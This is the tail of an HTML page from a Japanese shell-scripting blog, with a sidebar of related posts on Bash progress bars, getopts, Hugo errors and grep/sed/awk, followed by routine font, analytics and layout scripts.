<source srcset="https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=30>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=15>
<img src=https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg 2x" width=100 height=30 loading=lazy alt=【プログレスバー】Bashでプログレスバーを作ってみようって話>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【プログレスバー】Bashでプログレスバーを作ってみようって話</strong>
<p class=text>今回は、シェルスクリプトでプログレスバーを作ってみようと思います。処理の進捗をコンソールに表示させることで処理の進捗が確認できるのはデバッグや最適化にも役に立ちます。 プログレスバー ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。 処理が進むにつれて、ジリジリとメーターが右に増えていくあ…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=129>
<source srcset="https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=64>
<img src=https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg 2x" width=100 height=129 loading=lazy alt=（１１）【getopts】シェルスクリプトコマンド活用紹介>
</picture>
</div>
<div class=article-details>
<strong class=article-title>（１１）【getopts】シェルスクリプトコマンド活用紹介</strong>
<p class=text>シェルスクリプトでオプションを処理したい getoptsコマンド オプションを解析する エラーメッセージを表示しない 引数付きのオプションを使用する getoptsコマンド概要 「getopt…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2021-12-21-03/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=75>
<source srcset="https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=38>
<img src=https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_200x0_resize_q75_box.jpg 2x" width=100 height=75 loading=lazy alt="hugoで[failed to unmarshal YAML]エラーが出た場合の対処法">
</picture>
</div>
<div class=article-details>
<strong class=article-title>hugoで[failed to unmarshal YAML]エラーが出た場合の対処法</strong>
<p class=text>エラーの内容 記事投稿時にfailed to unmarshal YAM エラーが起こった…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」</strong>
<p class=text>Bash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。'function_return.sh'という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。 関数からの戻り値の受け渡し 関数からの戻り値の受け渡し： Bash関数は、数値と…</p>
</div>
</a>
</article>
<article class=has-image>
<a href=https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/>
<div class=article-image>
<picture class=picture>
<source srcset="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" media="(min-width: 769px)" width=100 height=127>
<source srcset="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_50x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 2x" media="(max-width: 768px)" width=50 height=63>
<img src=https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg srcset="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_100x0_resize_q75_box.jpg 1x, https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg 2x" width=100 height=127 loading=lazy alt=【grep/sed/awkも】ざっくりわかるシェルスクリプト５」>
</picture>
</div>
<div class=article-details>
<strong class=article-title>【grep/sed/awkも】ざっくりわかるシェルスクリプト５」</strong>
<p class=text>この記事はシェルスクリプトを４５分でざっくりマスターできるチュートリアルです。bashスクリプト「Hello, World」から、ifステートメントなどの条件分岐、while, for, untilループをはじめ、シェルスクリプトの効率的なデバッグ手法の紹介など、シェルスクリプトを網羅的かつ短時間で学習することができます。 …</p>
</div>
</a>
</article>
</div>
</div>
</div>
</aside>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://suzukiiichiro.github.io/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
<script type=module>
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
  import { getAnalytics, logEvent } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";
  const firebaseConfig = {
    apiKey: "AIzaSyDuTc8tgNsMVZK0YbZbH_i23ESm9YT1Vx4",
    authDomain: "nlp-blog-927bd.firebaseapp.com",
    projectId: "nlp-blog-927bd",
    storageBucket: "nlp-blog-927bd.appspot.com",
    messagingSenderId: "469873098519",
    appId: "1:469873098519:web:9ae03fb6e0a40fbf06c152",
    measurementId: "G-TC37CVBC0B"
  };
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  
</script>
<script src=https://suzukiiichiro.github.io/js/Custom.js></script>
<script>let setFillHeight=()=>{let a=window.innerHeight*.01;document.documentElement.style.setProperty('--vh',`${a}px`)};window.addEventListener('resize',setFillHeight),setFillHeight(),document.addEventListener('DOMContentLoaded',()=>{let a=document.getElementsByTagName('code');Array.from(a).forEach(a=>{if(a.className){let b=a.className.split(':'),d=b[0],c=b[1];c&&(a.classList.remove(a.className),a.classList.add(d),a.parentElement.setAttribute('data-lang',c),a.parentElement.classList.add('code-block-header'))}})})</script>
</body>
</html>